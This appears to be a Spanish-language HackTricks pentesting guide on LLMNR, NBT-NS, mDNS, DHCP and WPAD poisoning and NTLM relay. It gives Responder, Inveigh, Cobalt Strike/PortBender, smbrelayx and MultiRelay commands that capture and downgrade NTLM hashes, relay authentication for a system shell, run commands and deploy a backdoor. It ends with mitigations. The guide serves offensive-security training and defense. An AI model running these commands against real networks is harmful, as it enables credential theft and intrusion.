# Suplantación de LLMNR, NBT-NS, mDNS/DNS y WPAD y Ataques de Relevo

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Protocolos de red

### LLMNR, NBT-NS y mDNS

Los sistemas de Microsoft utilizan la Resolución de Nombres Multicast de Ámbito Local (LLMNR) y el Servicio de Nombres NetBIOS (NBT-NS) para la resolución local de hosts cuando las consultas DNS fallan. Bonjour de Apple y las implementaciones de configuración cero de Linux utilizan DNS Multicast (mDNS) para descubrir sistemas dentro de una red. Estos protocolos son no autenticados y transmiten mensajes a través de UDP; por lo tanto, los atacantes pueden explotarlos para dirigir a los usuarios a servicios maliciosos.

Puedes suplantar servicios que son buscados por los hosts utilizando Responder para enviar respuestas falsas.\
Lee aquí más información sobre [cómo suplantar servicios con Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### WPAD

Muchos navegadores utilizan el Descubrimiento Automático de Proxy Web (WPAD) para cargar la configuración de proxy de la red. Un servidor WPAD proporciona la configuración de proxy del cliente a través de una URL específica (por ejemplo, _http://wpad.example.org/wpad.dat_) al ser identificado a través de cualquiera de los siguientes:

* DHCP, utilizando una entrada de código 252[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, buscando el nombre de host _wpad_ en el dominio local
* Microsoft LLMNR y NBT-NS (en caso de fallo de la consulta DNS)

Responder automatiza el ataque WPAD: ejecutando un proxy y dirigiendo a los clientes a un servidor WPAD malicioso a través de DHCP, DNS, LLMNR y NBT-NS.

## Envenenamiento de Protocolos

### Responder - LLMNR, NBT-NS y MDNS

> Responder es un envenenador de LLMNR, NBT-NS y MDNS. Responderá a consultas _específicas_ de NBT-NS (Servicio de Nombres NetBIOS) basadas en su sufijo de nombre (ver: [http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)). Por defecto, la herramienta solo responderá a solicitudes del Servicio de Servidor de Archivos, que es para SMB.
>
> La idea detrás de esto es dirigir nuestras respuestas y ser más sigilosos en la red. Esto también ayuda a asegurar que no interrumpamos el comportamiento legítimo de NBT-NS.

* [**Responder**](https://github.com/lgandx/Responder) está instalado por defecto en kali y el archivo de configuración se encuentra en \*\*`/etc/responder/Responder.conf` \*\* (aquí puedes desactivar servidores falsos)
* **Responder** **imprimirá hashes en pantalla** y los **escribirá** en un **archivo de registro** por host ubicado en el directorio `/usr/share/responder/logs`. Los hashes se guardan en el formato `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`
* Puedes encontrar aquí Responder para **windows** [aquí](https://github.com/lgandx/Responder-Windows)
* Responder funciona en **ipv4** y **ipv6**

#### Parámetros de Responder

Responder soporta las siguientes opciones:
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>Parámetros de Responder</summary>

* La bandera `-A` nos pone en **modo de análisis**, permitiéndonos ver solicitudes NBT-NS, BROWSER y LLMNR en el entorno sin envenenar ninguna respuesta.
* Siempre debemos proporcionar una interfaz o una IP.
* `-wf` iniciará el servidor proxy WPAD malicioso
* `-f` intentará identificar el sistema operativo remoto y su versión
* Usa la bandera `-v` para aumentar la verbosidad (una gran cantidad de datos adicionales se imprimirán en la consola)
* Opciones como `-F` y `-P` pueden usarse para forzar la autenticación NTLM o Básica y forzar la autenticación del proxy, pero pueden causar un aviso de inicio de sesión, por lo que se deben usar con moderación.
* La bandera `-w` utiliza el servidor proxy WPAD integrado. Esto puede ser muy efectivo, especialmente en organizaciones grandes, porque capturará todas las solicitudes HTTP de cualquier usuario que inicie Internet Explorer si el navegador tiene [Auto-detect settings](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) habilitado.

</details>

#### Ejecutando Responder

Para ejecutar el comportamiento predeterminado de Responder solo tienes que ejecutar:
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
Una técnica interesante es utilizar responder para degradar la autenticación NTLM cuando sea posible. Esto permitirá **capturar desafíos y respuestas NTLMv1** en lugar de NTLMv2 que pueden ser **fácilmente descifrados** [**siguiendo esta guía**](../../windows-hardening/ntlm/#ntlmv1-attack)**.**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
Por **defecto**, la **impersonación de WPAD no se ejecutará**, pero puedes ejecutarla haciendo:
```bash
responder -I <Iface> --wpad
```
También puedes **resolver solicitudes NetBIOS** con **tu IP**. Y crear un **proxy de autenticación**:
```bash
responder.py -I <interface> -Pv
```
```markdown
No podrás interceptar hashes NTLM (normalmente), pero puedes capturar fácilmente algunos **desafíos y respuestas NTLM** que puedes **descifrar** usando, por ejemplo, la opción de _**john**_ `--format=netntlmv2`.

Los **registros y los desafíos** de la instalación predeterminada de _**Responder**_ en kali se pueden encontrar en `/usr/share/responder/logs`

#### Responder - Envenenamiento DHCP

Windows utiliza varias opciones DHCP personalizadas como NetBIOS, WINS, configuraciones WPAD. Cuando una estación de trabajo envía una solicitud DHCP para obtener su configuración de red, estas configuraciones adicionales pueden incluirse en la respuesta DHCP para facilitar la conectividad y resolución de nombres de manera sencilla.

Suplantar respuestas DHCP sin interrupciones puede ser desafiante ya que estás interfiriendo con la configuración de red de una estación de trabajo. Generalmente, necesitas tener un conocimiento muy bueno de la subred objetivo, dónde está el servidor DNS, dónde está el switch, tabla de enrutamiento, dominio, máscara de red, servidor DHCP, etc. **Cualquier error con estas configuraciones resultará en una interrupción en la red.**

Sin embargo, suplantar respuestas DHCP tiene beneficios únicos. **Definitivamente es más sigiloso que el envenenamiento ARP**; Una respuesta unicast es suficiente para envenenar permanentemente la información de enrutamiento de una víctima, también es común ver múltiples servidores DHCP operando en una red. Las respuestas DHCP unicast son más complejas de detectar, algunos switches proporcionan configuraciones de seguridad para prevenir el fisgoneo DHCP, sin embargo, esas configuraciones no son sencillas y a menudo están mal configuradas cuando se habilitan.

> Este ataque es altamente efectivo y te asegura hashes NTLMv1/2.
```
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - Captura de credenciales

Responder va a **suplantar todos los servicios utilizando los protocolos mencionados**. Una vez que algún usuario intente acceder a un servicio que se resuelva utilizando esos protocolos, **intentará autenticarse contra Responder** y Responder podrá **capturar** las "credenciales" (probablemente un **desafío/respuesta NTLMv2**):

Es posible intentar degradar a NetNTLMv1 o intentar deshabilitar ESS.

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - Responder en C#/PowerShell

> Inveigh es una herramienta de spoofing y man-in-the-middle para ADIDNS/LLMNR/NBNS/mDNS/DNS en PowerShell diseñada para asistir a pentesters/equipos rojos que se encuentran limitados a un sistema Windows.

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) era un script de PowerShell, ahora es un binario en C# que tiene las mismas características principales que Responder. Hay un [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) que lista todos los parámetros e instrucciones de uso.\
Otra versión se puede encontrar en [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero).

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

O ejecútalo con más opciones:
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
O ejecuta la versión en C#:
```bash
Inveigh.exe
```
## Ataque de Relevamiento NTLM

Este ataque releva **sesiones de autenticación SMB** en una red interna hacia una **máquina objetivo**. Si la **sesión de autenticación es exitosa**, automáticamente te dará acceso a una **shell del sistema**. Por favor, ten en cuenta que la autenticación relevada debe ser de un **usuario que tenga acceso de Administrador Local en el host relevado** y que la **firma SMB debe estar desactivada**.

### Reenvío y túnel del puerto 445

{% hint style="warning" %}
Si puedes **introducir una máquina dentro de la red**, puedes usar cualquiera de las **herramientas** de la siguiente sección para realizar un ataque de relevamiento y no necesitas preocuparte por esto.
{% endhint %}

Sin embargo, en equipos rojos esto no es el caso, en equipos rojos usualmente necesitarás **reenviar el tráfico del puerto 445 de una máquina Windows a tu máquina** ejecutando cualquiera de las siguientes herramientas y luego **redirigir el tráfico de esa herramienta a través de un proxy** para alcanzar la máquina a atacar dentro de la interna.

La herramienta [**PortBender**](https://github.com/praetorian-inc/PortBender) \*\*\*\* es un controlador para **redirigir** el tráfico destinado al puerto **445 a otro puerto** (por ejemplo, 8445) al que **podemos enlazar**. **Requiere acceso de administrador local** para que el controlador se cargue. Tiene sentido usar `cd C:\Windows\System32\drivers` ya que aquí es donde la mayoría de los controladores de Windows se encuentran.
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

Si quieres usar **MultiRelay**, ve a _**/usr/share/responder/tools**_ y ejecuta MultiRelay (`-t <IP objetivo> -u <Usuario>`):
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
### Forzar Inicios de Sesión NTLM

En Windows **puedes forzar a algunas cuentas privilegiadas a autenticarse en máquinas arbitrarias**. Lee la siguiente página para aprender cómo:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Solución

### Deshabilitar LLMNR

Para deshabilitar LLMNR en tu dominio para clientes DNS, abre gpedit.msc.\
Navega a Configuración del equipo->Plantillas administrativas->Red->Cliente DNS.\
Localiza la opción “Desactivar la resolución de nombres multicast” y haz clic en “configuración de la política”:

![](../../.gitbook/assets/1.jpg)

Una vez que se abra la nueva ventana, habilita esta opción, presiona Aplicar y haz clic en Aceptar:

![](../../.gitbook/assets/2.jpg)

### **Deshabilitar NBT-NS**

Una opción para deshabilitar NBT-NS es usar las opciones de ámbito de DHCP.

Si usas el servidor DHCP de Microsoft, selecciona el ámbito para el cual quieres deshabilitar NBT-NS. Haz clic derecho en “Opciones de ámbito” y haz clic en “Configurar opciones”. En el ejemplo a continuación, el ámbito DHCP en el que quiero deshabilitar NBT-NS es 192.168.1.100.

![](../../.gitbook/assets/3.jpg)

En la ventana de Opciones de ámbito, navega a la pestaña avanzada, cambia el menú desplegable a “Opciones de Microsoft Windows 2000”:

![](../../.gitbook/assets/4.jpg)

Selecciona la opción “001 Microsoft Disable Netbios Option” de la lista y cambia su valor a “0x2”, haz clic en Aplicar y luego en Aceptar:

![](../../.gitbook/assets/5.jpg)

### WPAD

Para mitigar contra el ataque WPAD, puedes añadir una entrada para "wpad" en tu zona DNS. Ten en cuenta que la entrada DNS no necesita apuntar a un servidor WPAD válido. Mientras las consultas se resuelvan, el ataque se prevendrá.

### Multi-relay

1\. **Forzar la firma SMB en todas las máquinas Windows locales**. Esta configuración firmará digitalmente cada sesión SMB, lo que obliga tanto al cliente como al servidor a verificar el origen de los paquetes antes de continuar. Esta configuración solo está habilitada por defecto en los Controladores de Dominio. Los siguientes artículos de Microsoft detallan estas configuraciones (que se pueden habilitar a través de la política de grupo) y cómo implementarlas.

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **Revisar y asegurar que los usuarios en la red local solo puedan iniciar sesión de forma remota en las máquinas donde sea necesario**. Por ejemplo: Sally solo puede iniciar sesión en la estación de trabajo de Sally. Si un atacante interceptara la sesión de autenticación SMB de Sally, no podrían retransmitir la sesión a ninguna estación de trabajo, haciendo este método inútil.

3\. **Restringir la autenticación NTLM en la red local tanto como sea posible**. Este ataque no puede aprovechar la autenticación Kerberos, por lo que limitando la cantidad de NTLM que ocurre, este ataque puede ser grandemente obstaculizado. Hay información de Microsoft sobre cómo hacer esto, pero ten cuidado... Si la autenticación Kerberos falla por cualquier motivo, generalmente recurre a NTLM. Si lo deshabilitas completamente, tu red podría detenerse.

4\. **Prevenir usuarios no autorizados en tu red**. Una amenaza interna probablemente no utilizará un ataque de retransmisión SMB, ya que ya tienen credenciales de red. Al reforzar tus políticas de seguridad física, previniendo dispositivos no autorizados en la red con ACLs y filtrado MAC, y asegurando una adecuada segmentación de la red, puedes limitar en gran medida la amenaza de que este ataque se realice.

## Referencias

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **Imágenes de:**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en github.

</details>
